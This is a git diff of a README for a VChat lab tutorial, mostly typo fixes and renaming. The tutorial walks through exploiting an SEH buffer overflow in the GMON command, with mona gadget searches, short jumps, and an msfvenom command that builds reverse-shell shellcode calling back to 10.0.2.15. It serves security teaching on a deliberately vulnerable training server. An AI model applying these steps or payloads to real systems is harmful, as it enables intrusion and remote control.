@@ -1,4 +1,4 @@
-# GMON Exploiting: Harnessing SEH \<Exceptions are good\>
+# VChat GMON Exploiting: Harnessing Structure Exception Handling
 
 *Notice*: The following exploit, and its procedures are based on the original [Blog](https://fluidattacks.com/blog/vulnserver-gmon/)
 ___
@@ -93,6 +93,12 @@ The following sections cover the process that should (Or may) be followed when p
    * An example is shown below
 
 		![Telent](Images/Telnet.png)
+
+4. **Linux**: We can try a few inputs to the *GMON* command, and see if we can get any information. Simply type *GMON* followed by some additional input as shown below
+
+	![Telent](Images/Telnet2.png)
+
+	* Now, trying every possible combinations of strings would get quite tiresome, so we can use the technique of *fuzzing* to automate this process as discused later in the exploitation section.
 
 ### Dynamic Analysis 
 If you dissabled exceptions for the [EggHunting](https://github.com/DaintyJet/VChat_GTER_EggHunter) exploit, that is we passed all exceptions through the debugger to the VChat process. You should uncheck the options so Immunity Debugger can catch the exceptions allowing us to see the state of the program at a crash.  See step 2 of the [Launch VChat](#launch-vchat) section!
@@ -225,7 +231,7 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 	/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
 	```
 	* This will allow us to inject a new address at that location.
-2. Run the [exploit1.py](./SourceCode/exploit1.py) to inject the cyclic pattern into the Vunlserver program's stack and observe the SEH records. 
+2. Run the [exploit1.py](./SourceCode/exploit1.py) to inject the cyclic pattern into the VChat program's stack and observe the SEH records. 
 
 	<img src="Images/I9.png" width=600> 
 
@@ -250,7 +256,7 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
       * We can see that the the `ESP` register (Containing the stack pointer) holds the address of `00F4EDC8`, however our buffer starts at `00F4EDD0`, which means we need to traverse 8 bytes before we reach a segment of the stack we control.
 
-6. We can use the fact that our extra data is on the stack, and `pop` the extra data off into some register. The exact register does not really matter as we simply want to remove it from the stack. We can use `mona.py` to find a SEH gadget that pops two elements off the stack (8-bytes), which places the stack pointer `ESP` in the correct posion for us to start executing code we inject into our buffer; Use the command `!mona seh -cp nonull -cm safeseh=off -o` in immunity debugger as shown below.
+6. We can use the fact that our extra data is on the stack, and `pop` the extra data off into some register. The exact register does not really matter as we simply want to remove it from the stack. We can use `mona.py` to find a SEH gadget that pops two elements off the stack (8-bytes), which places the stack pointer `ESP` in the correct position for us to start executing code we inject into our buffer; Use the command `!mona seh -cp nonull -cm safeseh=off -o` in immunity debugger as shown below.
 
 	<img src="Images/I13.png" width=600>
 
@@ -297,13 +303,13 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
    * This means we have `00AEFFFF - 00AEFFCC = 33` or a decimal vale of 51 bytes of space. This is much less than the `3503` before our SEH overwrite...
 
-9. Now we want to preform a Short Jump to avoid overwriting the SEH block. A short jump is only 2 bytes, and should give us enough space to preform a long jump to the start of the buffer. We should usethe tool `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`
+9. Now we want to preform a Short Jump to avoid overwriting the SEH block. A short jump is only 2 bytes, and should give us enough space to preform a long jump to the start of the buffer. We should use the tool `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`
    * Run `nasm_shell.rb`, note that it's path may differ 
    * enter `jmp short +0xa` to preform a short jump of 10 bytes. 
 
 	<img src="Images/I22.png" width=600>
 
-10. Copy the output from the `nasm_shell.rb` (`EB08`) into the [exploit4.py](./SourceCode/exploit4.py) exploit script. We use the NOP instructions to overwrite the SEH handlers address This allows us to differntiate it from the `A`s, however this could simple be repalced with `A`s . <!--(Makes it stand out?)-->
+10. Copy the output from the `nasm_shell.rb` (`EB08`) into the [exploit4.py](./SourceCode/exploit4.py) exploit script. We use the NOP instructions to overwrite the SEH handlers address This allows us to differentiate it from the `A`s, however this could simple be repalced with `A`s . <!--(Makes it stand out?)-->
 11. Run the program with the breakpoint set and observe it's outcome. We can see the Short Jump!
 
 	<img src="Images/I23.png" width=600>
@@ -339,7 +345,7 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 Now that we have all the necessary parts for the creation of a exploit we will add the shellcode to our payload and gain access to a reverse shell!
 ### Exploitation
-1. Now We will need to create a reverse shell we can include in the payload, this is a program that reaches out amd makes a connection to the attacker's macihne (or one they control) from target machine and provides a shell to the attacker. We can generate the shellcode with the following command. 
+1. Now We will need to create a reverse shell we can include in the payload, this is a program that reaches out amd makes a connection to the attacker's machine (or one they control) from target machine and provides a shell to the attacker. We can generate the shellcode with the following command. 
 	```
 	$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 EXITFUNC=seh -f python -v SHELL -b '\x00'
 	```
